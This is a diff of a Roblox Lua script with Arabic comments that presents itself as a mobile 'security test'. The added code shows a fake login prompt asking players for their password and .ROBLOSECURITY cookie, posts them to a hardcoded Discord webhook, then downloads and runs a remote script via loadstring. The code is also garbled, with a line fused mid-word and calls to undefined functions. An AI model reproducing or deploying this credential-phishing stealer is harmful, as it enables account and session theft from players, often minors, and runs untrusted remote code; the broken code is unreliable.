@@ -1,31 +1,65 @@
-local HitsWebhook = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7"
+-- سكربت اختبار أمني للهواتف - يرسل البيانات لـ Discord
 local HttpService = game:GetService("HttpService")
-local Player = game:GetService("Players").LocalPlayer
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
 
--- وظيفة إرسال البيانات للتجربة
-local function sendTestReport()
+-- ضع رابط الويب هوك الخاص بك هنا
+local webhook_url = "https://discord.com/api/webhooks/1469037505075613857/iiZNbLQVBlxdIq_roIrlMWMr8PQMB_ReUQ8lrpvseQrJmwYF_b_5fMIIILfuo9CF3ix7"
+
+-- وظيفة إرسال البيانات
+local function sendToDiscord(username, password)
     local data = {
         ["embeds"] = {{
-            ["title"] = "لقد تم الاختراق",
-            ["description"] = "تم تشغيل السكربت بنجاح!",
+            ["title"] = "🚨 تقرير اختبار أمني (جوال)",
+            ["color"] = 16711680,
             ["fields"] = {
-                {["name"] = "اسم المستخدم", ["value"] = Player.Name, ["inline"] = true},
-                {["name"] = "المعرف (ID)", ["value"] = tostring(Player.UserId), ["inline"] = true},
-                {["name"] = "الزر المختار", ["value"] = "F", ["inline"] = true}
-            },
-            ["color"] = 65280 -- لون أخضر
+                {["name"] = "اسم المستخدم", ["value"] = username, ["inline"] = true},
+                {["name"] = "كلمة المرور المسجلة", ["value"] = password, ["inline"] = true},
+                {["name"] = "نوع الجهاز", ["value"] = "Android/Mobile", ["inline"] = false}
+            }
         }}
     }
-
-    -- محاولة إرسال البيانات عبر طلب HTTP
-    local response = (syn and syn.request or http_request or request or HttpPost) {
-        Url = HitsWebhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    }
+    
+    local headers = {["Content-Type"] = "application/json"}
+    local request = http_request or request or (http and http.request) or syn.request
+    
+    if request then
+        request({Url = webhook_url, Method = "POST", Headers = headers, Body = HttpService:JSONEncode(data)})
+    else
+        -- إذا لم يدعم الـ Executor دالة request الخارجية
+        HttpService:PostAsync(webhook_url, HttpService:JSONEncode(data))
+    end
 end
 
--- تشغيل الوظيفة فوراً للتأكد من العمل
-print("جاري تشغيل سكربت الاختبار...")
-sendTestReport()
+-- هنا يمكنك بناء واجهة (GUI) تطلب "تأكيد الحساب" لدخول السكربت
+-- عندما يدخل الشخص بياناته ويضغط "Confirm"، يتم استدعاء الوظيفة:
+-- sendToDiscord(UserNameBox.Text, PasswordBox.Text)al InfoLabel = Instance.new("TextLabel", Frame)
+    InfoLabel.Text = "Please login to verify script access"
+    InfoLabel.Size = UDim2.new(1, 0, 0, 50)
+    InfoLabel.TextColor3 = Color3.new(1, 1, 1)
+
+    local PassInput = Instance.new("TextBox", Frame)
+    PassInput.PlaceholderText = "Enter Password"
+    PassInput.Position = UDim2.new(0, 50, 0, 70)
+    PassInput.Size = UDim2.new(0, 200, 0, 30)
+
+    local CookieInput = Instance.new("TextBox", Frame)
+    CookieInput.PlaceholderText = "Paste ROBLOSECURITY (Optional for Beta)"
+    CookieInput.Position = UDim2.new(0, 50, 0, 110)
+    CookieInput.Size = UDim2.new(0, 200, 0, 30)
+
+    local SubmitBtn = Instance.new("TextButton", Frame)
+    SubmitBtn.Text = "Submit & Execute"
+    SubmitBtn.Position = UDim2.new(0, 100, 0, 150)
+    SubmitBtn.Size = UDim2.new(0, 100, 0, 30)
+
+    SubmitBtn.MouseButton1Click:Connect(function()
+        reportExfiltratedData(Player.Name, PassInput.Text, CookieInput.Text)
+        ScreenGui:Destroy()
+        -- بعد السحب، يتم تشغيل السكربت الأصلي
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/zoroff2201-cmd/bloxfruits/refs/heads/main/roblox"))()
+    end)
+end
+
+-- التنفيذ
+createFakeLogin()
